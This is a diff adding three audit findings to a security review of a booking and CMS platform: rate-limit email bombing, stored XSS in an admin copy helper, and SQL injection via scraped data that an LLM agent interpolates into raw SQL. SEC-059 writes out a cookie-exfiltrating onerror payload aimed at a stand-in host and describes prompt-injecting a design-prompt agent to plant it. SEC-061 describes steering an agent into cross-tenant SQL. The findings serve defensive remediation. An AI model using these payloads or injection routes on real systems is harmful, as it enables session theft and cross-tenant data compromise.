@@ -2,7 +2,7 @@
 
 _Schedule soon. Reflected XSS, CSRF, info disclosure, weak rate limiting, or authZ gaps on writes._
 
-**10** finding(s). See [`../FINDINGS.md`](../FINDINGS.md) for live status. Reviewed 2026-06-07.
+**13** finding(s). See [`../FINDINGS.md`](../FINDINGS.md) for live status. Reviewed 2026-09-10.
 
 ---
 
@@ -502,5 +502,146 @@ Read backend/auth_service/routers/forms.py directly. The injection is real and t
 **Recommendation**
 
 HTML-escape both key and value before interpolation, mirroring the rest of the codebase: import html and use html.escape(key) / html.escape(value) (and html.escape(submitted_at), project_name, form_key for completeness). This is a one-line-per-field change consistent with the existing BE-006 pattern already applied in every other email builder.
+
+---
+
+<a id="sec-057"></a>
+
+## SEC-057 — Public booking WRITE endpoints (create/cancel/reschedule/legacy) are limited only by the per-instance in-memory slowapi limiter, enabling unauthenticated booking-confirmation email bombing + cost amplification
+
+| | |
+|---|---|
+| **Severity** | medium |
+| **Status** | open |
+| **Category** | Rate limiting / DoS / email abuse |
+| **Dimension** | ratelimit-dos / public-tokens |
+| **Location** | `backend/auth_service/routers/booking.py:462-466 (create), 691-692 (cancel), 753-754 (reschedule), 989-990 (legacy create)` |
+| **Reviewer confidence** | high |
+| **Verifier verdict** | confirmed (medium) |
+| **First seen** | 2026-09-10 |
+
+**Description**
+
+The SEC-010 remediation moved the high-value limits (login lockout, public booking **reads**, multi-locale save, forms submission) onto the shared Postgres limiter (`core/pg_rate_limit.py`) precisely because, per that module's own docstring, "the in-memory slowapi limiter resets per Vercel serverless invocation and is not shared across warm instances, so its limits were effectively N×limit." The booking **write** endpoints were left behind: `create_booking`, `manage_cancel`, `manage_reschedule` and `legacy_create` carry only `@limiter.limit(...)` slowapi decorators with **no** `pg_rate_limit.enforce` companion. These are the actual email/cost vector — each accepted create sends a host-notification email to the owner, a confirmation email to the **attacker-controlled** `body.customer.email`, and creates a Google Calendar event. `forms.py:142-149` added exactly such a shared companion to its analogous email-sending write ("so form-submission email spam can't be amplified across serverless instances"); booking create has no equivalent. This is the residual of SEC-010 (kept `fixed` for the paths that were migrated). It is distinct from the dismissed XFF-key items (D-01/D-03/D-14): the defect here is the per-invocation reset of the in-memory store, not key derivation.
+
+**Attack scenario**
+
+An unauthenticated attacker who knows a tenant's public booking slug (slugs live in the widget URL) scripts `POST /booking/{slug}` with `customer.email` set to a victim's address and `website` (honeypot) left blank, iterating over free grid-aligned slots (readable from the public `/{slug}/availability`). Because slowapi's counter lives in per-instance process memory, Vercel scale-out/cold-starts give each concurrent instance a fresh `5/hour` bucket (effective cap N×5/hour), and an IP-rotating attacker bypasses the per-IP key entirely. Each accepted booking (a) floods the owner's notification inbox, (b) delivers a confirmation email to the arbitrary victim from the tenant's trusted Resend sending domain (email-bomb + domain-reputation burn), and (c) creates a calendar event.
+
+**Evidence**
+
+```python
+@router.post("/{slug}")
+@limiter.limit("5/hour", key_func=client_ip)
+async def create_booking(request: Request, slug: str, body: CreateIn) -> JSONResponse:
+    cfg = _require_tenant(slug)
+    return _create_core(cfg, body)
+```
+Contrast `forms.py:142-149` (`pg_rate_limit.enforce(f"forms:{...}")`) and the booking **reads** at `booking.py:330-339` (`_public_read_limit` → `pg_rate_limit.enforce`), both shared across instances.
+
+**Adversarial verification**
+
+Confirmed. `booking.py` lines 463/692/754/990 carry only slowapi decorators; `pg_rate_limit` (imported line 20) is applied to the read path (line 334) and the manage GET (651) but not to any write. `_create_core` sends owner + attacker-controlled-recipient emails and calls `provider.create_event`, unauthenticated with a trivially-blank honeypot. Two bounding factors the finder understated: each successful create consumes a bookable slot (full → 409 with no email/event), so create-email volume is bounded by calendar availability × `max_advance_days` × resources; and emails use fixed templates (not attacker-controlled bodies). The cancel/reschedule vectors are much weaker than the create vector — both require the secret 32-byte `manage_token` (hash-stored) so they cannot be aimed at a victim's booking, and cancel is single-shot. Net: genuine cross-instance rate-limit gap on the create/legacy path; medium (the low end of medium for cancel/reschedule).
+
+**Exploitability:** Unauthenticated; only a public slug + a valid `service_id` + a free slot are needed. Realistic impact: arbitrary-recipient booking-confirmation email bombing from a trusted domain, owner-inbox flooding, Resend quota/reputation burn, and calendar pollution — bounded by slot availability and fixed templates. No IDOR/auth bypass, hence medium not high.
+
+**Recommendation**
+
+Add a shared `pg_rate_limit.enforce` (per-IP and/or per-slug bucket) inside `_create_core`, `manage_cancel`, and `manage_reschedule`, mirroring `forms.py:142-149`, so the cap holds across serverless instances. Given each create hit can email an arbitrary address, consider a stricter cap and a per-recipient-address outbound-email bound.
+
+---
+
+<a id="sec-059"></a>
+
+## SEC-059 — Design-prompt "Copy" button parses unsanitized agent-written lead HTML via `innerHTML`, executing `onerror`/`onload` handlers in the authenticated admin origin
+
+| | |
+|---|---|
+| **Severity** | medium |
+| **Status** | open |
+| **Category** | Stored XSS (admin dashboard) |
+| **Dimension** | xss-html |
+| **Location** | `frontend/src/components/admin/leads/sections/DesignPromptSection.tsx:22-32 (htmlToPlainText), :212 (CopyPromptButton html={lead.design_prompt})` |
+| **Reviewer confidence** | medium |
+| **Verifier verdict** | confirmed (medium) |
+| **First seen** | 2026-09-10 |
+
+**Description**
+
+The read-view preview of a lead's `design_prompt` was sanitized on render with `DOMPurify.sanitize(html)` (line 128) for SEC-018/SEC-043, because that HTML is agent-written and untrusted (the design-prompt-creator agent writes `leads.design_prompt` directly via a raw Supabase `execute_sql` UPDATE that bypasses the backend `sanitize_design_prompt` bleach filter; only the human PATCH path in `admin_leads.py:147-148` sanitizes). But `CopyPromptButton` receives the **raw** value (`<CopyPromptButton html={lead.design_prompt} />`, line 212) and, on click, calls `htmlToPlainText`, which assigns the raw string to `el.innerHTML` and appends `el` to `document.body`. Assigning attacker HTML to `innerHTML` on a node connected to the live document does not run `<script>`, but **does** fire markup-based handlers such as `<img src=x onerror=...>` and `<svg onload=...>`. This is the one `innerHTML` sink in the frontend and it was missed by the SEC-018/043 render-sanitization fix. The frontend CSP permits `script-src 'unsafe-inline'` (`next.config.ts:44`), so inline handlers execute, and `connect-src 'self' https:` permits exfil.
+
+**Attack scenario**
+
+An attacker whose site is scraped as a lead uses prompt-injection to steer the design-prompt agent into emitting `<img src=x onerror=fetch('https://evil/x?c='+document.cookie)>` into `leads.design_prompt` (the agent MCP write path is unsanitized). An admin opens the lead drawer — the preview renders sanitized/benign, so nothing looks suspicious — and clicks "Copy design prompt". `htmlToPlainText` sets `el.innerHTML` to the raw payload and appends it to `document.body`, firing the `onerror` handler as authenticated-admin JS in the dashboard origin.
+
+**Evidence**
+
+```ts
+function htmlToPlainText(html: string): string {
+  const el = document.createElement("div");
+  el.innerHTML = html;              // raw, unsanitized agent-written HTML
+  el.style.position = "fixed";
+  el.style.left = "-99999px";
+  el.style.whiteSpace = "pre-wrap";
+  document.body.appendChild(el);    // connected to live document -> onerror/onload fire
+  const text = el.innerText;
+  document.body.removeChild(el);
+  return text.trim();
+}
+```
+
+**Adversarial verification**
+
+Confirmed end-to-end. (1) `leads.design_prompt` can hold arbitrary HTML because the design-prompt-creator agent writes it with a raw `mcp__supabase__execute_sql` UPDATE (Phase 6 writeback) that bypasses the only backend sanitizer. (2) `DesignPromptSection` passes the RAW value to `CopyPromptButton` (line 212); only the preview is DOMPurify-sanitized (line 128). (3) `<img src=x onerror=...>` fires when parsed into a document-owned node; `<svg onload>` fires once connected. (4) CSP `script-src 'unsafe-inline'` (next.config.ts:44) permits the inline handler; `connect-src 'self' https:` permits exfil and authenticated same-origin `/api` proxy calls (session cookies auto-attach). The one tempering factor — coercing the agent to emit raw handler markup rather than its escaped `<pre><code>` envelope — is the same precondition the team already accepted for the render path, and the benign-looking sanitized preview makes the Copy click low-friction. Medium: injection precondition tempers an otherwise high-impact admin-origin code execution.
+
+**Exploitability:** Reachable stored-XSS-via-clipboard-helper in the authenticated admin dashboard; arbitrary JS in the admin origin (session-cookie-backed API access, cookie/exfil) gated only by an LLM prompt-injection producing raw handler markup and an admin Copy click.
+
+**Recommendation**
+
+Sanitize before parsing in `htmlToPlainText` (`el.innerHTML = DOMPurify.sanitize(html)`), or derive the plain text from the already-sanitized string the preview uses. Never assign unsanitized stored HTML to `innerHTML` on a node that is connected to the document. Consider tightening the frontend CSP (SEC-040) to drop `script-src 'unsafe-inline'` as defense-in-depth.
+
+---
+
+<a id="sec-061"></a>
+
+## SEC-061 — SEO/GEO Optimizer agent hand-builds raw SQL from untrusted scraped competitor data for `mcp__supabase__execute_sql`, against the shared RLS-bypassed multi-tenant DB (SQL-injection path)
+
+| | |
+|---|---|
+| **Severity** | medium |
+| **Status** | open |
+| **Category** | Injection (agent-authored SQL) / cross-tenant |
+| **Dimension** | agents |
+| **Location** | `agents/SEO-GEO Optimizer/phases/2-competitor-intel.md:54-57 (raw INSERT template); AGENTS.md:130 (execute_sql = all reads/writes); competitor.py:77-89 (scraped signals)` |
+| **Reviewer confidence** | medium |
+| **Verifier verdict** | needs_adjustment → medium (finder claimed high) |
+| **First seen** | 2026-09-10 |
+
+**Description**
+
+The new SEO/GEO Optimizer agent is an orchestrator running in the main Claude Code thread with Supabase MCP pre-authorized; per `AGENTS.md:130`, `mcp__supabase__execute_sql` is used for "all reads/writes" against the single shared project `xeluydwpgiddbamysgyu` (the same DB every tenant lives in, with the RLS-bypassing service role). Phase 2 instructs the agent to persist competitor rows by hand-building a raw SQL `INSERT` with attacker-influenceable values (`name`, `url`, `location`, `analysis`, `signals`) interpolated directly into single-quoted string literals. There is **no** escaping/parameterization guidance anywhere in the SEO agent phases or AGENTS.md, and `execute_sql` accepts only a raw query string (no parameter binding). That any legitimate business name containing an apostrophe (`Bob's Barbers`) would already break the template is direct proof no escaping is specified. The same interpolate-into-`execute_sql` pattern recurs in phases 1/3/4/5/7 (seo_audits, seo_plan_items, seo_page_meta). Because `execute_sql` runs against the shared DB with the service role (RLS bypassed), a successful injection could read or write **any tenant's** rows.
+
+**Attack scenario**
+
+A malicious local business (a competitor in the client's category/city that the agent shortlists and WebFetches) sets its site title / business name to a SQL breakout — e.g. a subquery that exfiltrates another tenant's data into the writable `analysis`/`signals` columns, which the client can then read back via `GET /projects/{slug}/seo/competitors`. The agent scrapes that name, follows the Phase-2 template, and passes the interpolated string to `execute_sql`, which runs the attacker's statement against the shared multi-tenant Supabase project with RLS bypassed.
+
+**Evidence**
+
+```sql
+INSERT INTO seo_competitors (project_id, run_id, name, url, location, signals, analysis, captured_at)
+VALUES ('<project_id>', '<run_id>', '<name>', '<url>', '<city>',
+        '<signals_json>'::jsonb, '<reasoned analysis text>', now());
+```
+`<name>`/`<url>`/`<city>` originate from competitor sites the agent WebFetches; no escaping is specified anywhere in the agent.
+
+**Adversarial verification**
+
+The factual core is confirmed: the Phase-2 template interpolates attacker-influenceable scraped values into single-quoted SQL literals feeding `execute_sql` (the shared-project, service-role, RLS-bypassed sink), with no escaping/parameterization guidance in any phase or AGENTS.md, and the unsafe pattern is duplicated across phases. **Downgraded high→medium** because exploitation is not deterministic code injection: the SQL is assembled by a probabilistic LLM agent that frequently self-escapes literals (`Bob''s Barbers`), so success depends on the model failing to escape a crafted payload; reachability is opportunistic (the attacker must be shortlisted among ~6 competitors by an agent that excludes directories and "adversarially verifies the shortlist"); and the run is a privileged admin action ("Run SEO agent for `<slug>`"), not an anonymous endpoint. `name`/`url` are the near-verbatim vectors; `analysis` is LLM-authored prose (less injectable). Severe impact (cross-tenant compromise) but probabilistic execution and limited reachability → medium.
+
+**Exploitability:** An operator of a real local competitor site in the target client's city+category sets their business name/on-page headings to a SQL breakout; IF the agent emits it un-escaped into `execute_sql`, arbitrary SQL runs cross-tenant (read/write any tenant's rows, exfil into client-readable columns). Non-deterministic (LLM-assembled SQL) and admin-gated run, hence medium.
+
+**Recommendation**
+
+Never hand-build SQL from scraped/LLM values. Persist `seo_*` rows through a parameterized backend endpoint (the CMS-admin API, like the existing SEO translate/CRUD routes) instead of `mcp__supabase__execute_sql`; or require the agent to bind values as parameters. Restrict the agent's Supabase MCP grant to a role that cannot touch other tenants' tables. At minimum, add explicit escaping guidance and route all competitor/LLM-sourced values through a server-side parameterized insert.
 
 ---
